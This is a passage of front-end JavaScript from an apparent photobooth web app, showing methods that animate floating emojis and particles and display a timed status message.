                    party: ['🎉', '🥳', '🎈', '🎊'],
                    cool: ['😎', '🤩', '👍', '🤙'],
                    cute: ['🥰', '😊', '😻', '✨']
                };

                const selectedEmojis = emojis[emojiType] || [];
                if (selectedEmojis.length === 0) return;

                // Clear existing emojis
                this.emojiEffects.innerHTML = ''; 

                for (let i = 0; i < 5 + Math.random() * 5; i++) { // Spawn 5-10 emojis
                    const emoji = document.createElement('span');
                    emoji.classList.add('emoji');
                    emoji.textContent = selectedEmojis[Math.floor(Math.random() * selectedEmojis.length)];
                    
                    const startX = Math.random() * 100;
                    const startY = 100 + Math.random() * 20; // Start slightly below view
                    
                    emoji.style.left = `${startX}%`;
                    emoji.style.top = `${startY}%`;
                    
                    // Randomize animation delay and duration for a more natural look
                    emoji.style.animationDelay = `${Math.random() * 0.5}s`;
                    emoji.style.animationDuration = `${3 + Math.random() * 2}s`; // 3-5 seconds
                    
                    this.emojiEffects.appendChild(emoji);

                    // Remove emoji after its animation finishes
                    emoji.addEventListener('animationend', () => {
                        emoji.remove();
                    });
                }
            }

            createFloatingParticles() {
                const particlesContainer = document.getElementById('particles');
                for (let i = 0; i < 50; i++) { // Create 50 particles
                    const particle = document.createElement('div');
                    particle.classList.add('particle');
                    particle.style.left = `${Math.random() * 100}vw`;
                    particle.style.top = `${Math.random() * 100}vh`;
                    particle.style.animationDelay = `${Math.random() * 8}s`; // Stagger animation start
                    particle.style.animationDuration = `${5 + Math.random() * 5}s`; // Vary duration
                    particlesContainer.appendChild(particle);
                }
            }

            showStatus(message, type) {
                this.statusMessage.textContent = message;
                this.statusMessage.className = `status-message show status-${type}`; // Reset and add new classes
                setTimeout(() => {
                    this.statusMessage.classList.remove('show');
                }, 3000); // Hide after 3 seconds
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            new ModernPhotobooth();
        });
    </script>
